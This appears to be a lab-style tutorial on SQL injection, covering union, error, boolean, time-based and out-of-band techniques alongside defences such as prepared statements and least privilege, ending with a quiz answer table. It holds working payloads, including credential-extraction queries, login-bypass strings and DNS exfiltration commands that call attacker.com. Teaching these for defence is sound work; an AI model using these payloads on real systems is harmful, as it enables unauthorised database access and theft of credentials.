

## What is SQL Injection?

SQL Injection occurs when a web application incorporates user-supplied input directly into a query without proper sanitisation or parameterisation. The attacker's input is treated as **code rather than data**, allowing them to alter the query's logic and interact with the database in ways the developer never intended.

---

## Types of SQL Injection

SQL Injection techniques are categorised based on how the attacker receives feedback from the database.

### 1. In-Band SQL Injection

The most common and easiest-to-exploit type. Results are returned **directly in the web application's response** — you inject through a web request and see extracted data right in the page response.

#### Error-Based Injection
Exploits database error messages displayed to the user. When a web application is misconfigured and shows raw database errors, those messages leak valuable information about the query structure, table names, and data.

Example: injecting `'` into a vulnerable parameter might produce:
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
```
This reveals: the database is MySQL, input is wrapped in single quotes, and the app doesn't handle errors gracefully.

#### Union-Based Injection
Uses the `UNION` operator to append a second `SELECT` query to the original, pulling data from any table the database user has access to.

**Step-by-step methodology:**

**Step 1 — Find the column count.** `UNION` requires both queries to have the same number of columns:
```sql
1 UNION SELECT 1        -- error
1 UNION SELECT 1,2      -- error
1 UNION SELECT 1,2,3    -- success! 3 columns
```

**Step 2 — Identify visible columns.** Use `0` so only the UNION output renders:
```sql
0 UNION SELECT 1,2,3
```
The numbers that appear on the page tell you which positions are usable for extraction.

**Step 3 — Get the database name:**
```sql
0 UNION SELECT 1,2,database()
```

**Step 4 — Enumerate tables:**
```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'
```

**Step 5 — Enumerate columns:**
```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'
```

**Step 6 — Extract data:**
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table
```

> **Why this works:** The column count must match because that's how SQL's UNION operator is defined. We use `0` or `-1` as the ID so the original query returns empty results, making only our injected output render. We use `information_schema` because it's the database's own catalogue of its structure.

---

### 2. Blind SQL Injection

The application does **not display query results or error messages**. The injection still works — the database still processes the malicious input — but you must infer success from the application's behaviour.

#### Authentication Bypass
The most intuitive form of blind SQLi. You never see database output — you only observe whether you're logged in or not.

Most login forms construct a query like:
```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```

**Classic bypass** — inject `' OR 1=1;--` as the username:
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```
- `OR 1=1` is always true → the entire WHERE clause becomes true
- `;--` ends the statement and comments out the password check
- The database returns every row → app logs you in as the first user (often admin)

**Target a specific user** — inject `admin'--`:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```
The password check is completely bypassed.

**Common payload variations:**

| Payload | Notes |
|---|---|
| `' OR 1=1;--` | Classic bypass, single quotes |
| `' OR 1=1#` | MySQL alternative comment character |
| `" OR 1=1--` | For queries using double quotes |

#### Boolean-Based Blind Injection
The application returns a **binary signal** — different page content, a `true`/`false` JSON response, or a subtle HTML change. You use this two-state feedback to ask the database yes/no questions.

**Step 1 — Confirm injection** with an always-true condition:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
If you get `{"taken":true}`, injection works.

**Step 2 — Extract the database name character by character:**
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```
False → not 'a'. Try `b%`, `c%`... when the response flips to true, you found the first letter. Then `sa%`, `sb%`... and so on.

**Step 3 — Enumerate tables and columns** using the same technique against `information_schema`:
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```

> This is slow — each character takes multiple requests — but it is reliable and works even when every other output channel is locked down.

#### Time-Based Blind Injection
Used when the application gives **absolutely nothing visual** to work with. Same content, same status code, same headers regardless of input. Your only signal is **response time**.

MySQL's `SLEEP()` pauses query execution:
```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```
- Response takes ~5 seconds → condition is **true**
- Response is immediate → condition is **false**

**Step 1 — Find column count:**
```sql
admin123' UNION SELECT SLEEP(5);--      -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--    -- 5 second delay (2 columns!)
```

**Step 2 — Enumerate data** the same way as Boolean-Based, but watch the clock instead of the page content.

> **Caution:** Network latency can cause false positives. Use longer sleep values (5–10 seconds) and test each character multiple times. On MSSQL, use `WAITFOR DELAY '0:0:5'` instead of `SLEEP()`.

---

### 3. Out-of-Band (OOB) SQL Injection

The attacker forces the **database server to make an external network request** (DNS or HTTP) that carries the exfiltrated data through a **separate channel**. Used when both in-band and blind techniques are not viable.

**Two channels involved:**
- **Attack channel** — your normal web request with the injection payload
- **Data channel** — an outbound DNS/HTTP request the database makes to your server, with stolen data embedded in it

#### DNS Exfiltration — MySQL
```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```
- `(SELECT database())` pulls the DB name (e.g. `webapp_db`)
- `CONCAT()` builds `\\webapp_db.attacker.com\share`
- `LOAD_FILE()` tries to read the path, triggering a DNS lookup for `webapp_db.attacker.com`
- Your server catches the request — the data is in the subdomain

> Works best on Windows-based MySQL servers where UNC paths trigger DNS resolution.

#### MSSQL Techniques
```sql
-- xp_dirtree — triggers a DNS lookup
EXEC master..xp_dirtree '\\attacker.com\share';

-- xp_cmdshell — runs OS commands (off by default in modern MSSQL)
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

#### Receiving the Data
| Tool | Notes |
|---|---|
| **Burp Collaborator** | Unique subdomain, logs DNS/HTTP callbacks |
| **Interactsh** (ProjectDiscovery) | Free, self-hostable alternative |
| **Custom listener** | Python DNS server with `dnslib` for full control |

#### OOB Limitations
- Database server needs outbound network access (often restricted in production)
- Payloads are database-engine-specific (MySQL, MSSQL, PostgreSQL all differ)
- DNS subdomain labels are limited to 63 characters
- Generally slower and less reliable than direct extraction

---

## When to Use Which Technique

| Scenario | Technique |
|---|---|
| Results visible in the page response | In-Band (Union-Based) |
| Errors visible in the page response | In-Band (Error-Based) |
| Login succeeds/fails, no output shown | Blind (Authentication Bypass) |
| App returns different content for true/false | Blind (Boolean-Based) |
| App response looks identical no matter what | Blind (Time-Based) |
| Time-based unreliable, no visible output, DB has network access | Out-of-Band |

---

## Defences Against SQL Injection

### 1. Prepared Statements (Parameterised Queries) ← Primary Defence

The most effective fix. Separates **code from data** — the query structure is defined first with placeholders, and user input is passed separately. The database always treats input as data, never as executable SQL.

**Vulnerable PHP:**
```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

**Fixed with PDO:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```
Even if the user enters `' OR 1=1--`, the database treats it as a literal string and never touches the query structure.

**Vulnerable Python:**
```python
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)
```

**Fixed:**
```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

### 2. Input Validation

Controls what the application accepts **before anything reaches the database**. Use **allowlisting** — define exactly what is valid and reject everything else.

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

> Always use alongside prepared statements, never as a standalone defence. **Blocklisting** (filtering `'` or `--`) is brittle — attackers bypass it with double encoding or alternate syntax.

### 3. Escaping User Input

Puts a backslash before special characters so the database treats them as literals (`'` → `\'`). Fragile and database-specific. Use only as a last resort when working with legacy code that can't be refactored.

### 4. Principle of Least Privilege

Limit the blast radius even if injection occurs. The database account the web app uses should have the **bare minimum permissions**:
- Read-only app → `SELECT` only, nothing else
- Never connect as `root` or `sa` from the application
- Lock down access to sensitive tables

If someone exploits SQLi through a low-privilege account, they can't `DROP` tables, access other databases, or run system commands.

### 5. Web Application Firewalls (WAFs)

Inspects incoming requests and blocks known attack patterns (`' OR 1=1`, `UNION SELECT`, `information_schema`...). Not a substitute for secure code — experienced attackers bypass WAFs with encoding tricks and obfuscation. Treat as an **extra layer only**.

---

## Quick Reference — Key Answers

| Question | Answer |
|---|---|
| What subtype of In-Band SQLi relies on error messages? | Error-Based |
| What SQL function returns the current database name? | `database()` |
| What boolean condition makes a WHERE clause always true? | `1=1` |
| What MySQL function causes a deliberate time delay? | `SLEEP()` |
| What protocol is commonly used for OOB data exfiltration? | DNS |
| What MSSQL procedure triggers DNS lookups? | `xp_dirtree` |
| What is the primary defence against SQL Injection? | Prepared Statements (Parameterised Queries) |